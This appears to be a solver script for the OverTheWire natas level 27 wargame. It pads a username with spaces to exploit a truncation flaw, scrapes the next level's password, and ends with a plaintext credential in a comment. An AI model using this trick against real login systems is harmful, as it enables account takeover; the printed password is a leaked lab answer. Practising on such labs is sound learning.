from bs4 import BeautifulSoup
import requests
import re

def make():
    res = requests.get(url=url,auth=lvl_pass, params=my_params, cookies=my_cookies)
    soup = BeautifulSoup(res.text, 'html.parser')
    return (res, soup)

def writeResponse(enumerate = ''):
    with open(f'./response{enumerate}.html', 'w') as browserFile:
        browserFile.write(soup.prettify())

lvl = '27'
next_level = str(int(lvl)+1)
pwd = open(f"./passwords/{'natas'+'0'+lvl if len(lvl)==1 else 'natas'+lvl}.pwd", 'r').read().strip()
url = f'http://natas{lvl}.natas.labs.overthewire.org'
lvl_pass = requests.auth.HTTPBasicAuth(f'natas{lvl}',pwd)

my_cookies = {}
username = 'natas28' + ' '*57
my_params = {'username':f'{username}X','password':'my_password'}
make()
my_params['username'] = username

res, soup = make()
pw = (re.search(r"[a-zA-Z0-9]{32}$", soup.find("div",id="content").text, re.MULTILINE)[0])

open(f"./passwords/{'natas'+'0'+next_level if len(next_level)==1 else 'natas'+next_level}.pwd", 'w').write(pw)


'''

Username: natas28
Password: skrwxciAe6Dnb0VfFDzDEHcCzQmv3Gd4
'''
